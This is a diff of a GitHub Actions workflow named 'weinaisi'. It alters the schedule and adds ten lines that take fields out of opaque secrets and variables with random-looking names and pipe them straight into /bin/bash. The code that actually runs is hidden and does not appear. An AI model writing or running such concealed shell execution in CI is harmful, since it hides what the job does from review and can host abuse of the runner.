@@ -3,7 +3,7 @@ name: weinaisi
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
+    - cron: '23 3/6 * * *'
 
 jobs:
   build:
@@ -12,11 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: weinaisi
         env:
-          h8039: ${{ secrets.h8039 }}
+          oz80: ${{ secrets.oz80 }}
         run: |
-          echo $h8039 | jq -r .fyicw36515 | /bin/bash
-          echo $nz99172 | jq -r .p88 | /bin/bash
-          echo $tnz3 | jq -r .i92 | /bin/bash
-          echo $r63 | jq -r .hzxo6355 | /bin/bash
-          echo $kyfe7 | jq -r .endar1916 | /bin/bash
+          echo $oz80 | jq -r .uml58 | /bin/bash
+          echo $vtgui18 | jq -r .yuke36 | /bin/bash
+          echo $jait7455 | jq -r .zwzmi2 | /bin/bash
+          echo $xbm507 | jq -r .d9202 | /bin/bash
+          echo $dzajv28 | jq -r .rrb51395 | /bin/bash
+          echo $p692 | jq -r .cr8 | /bin/bash
+          echo $qxshn10999 | jq -r .cecc332 | /bin/bash
+          echo $fjrof9 | jq -r .g9 | /bin/bash
+          echo $mhll7 | jq -r .mfog74 | /bin/bash
+          echo $noosw2 | jq -r .laj33 | /bin/bash
 
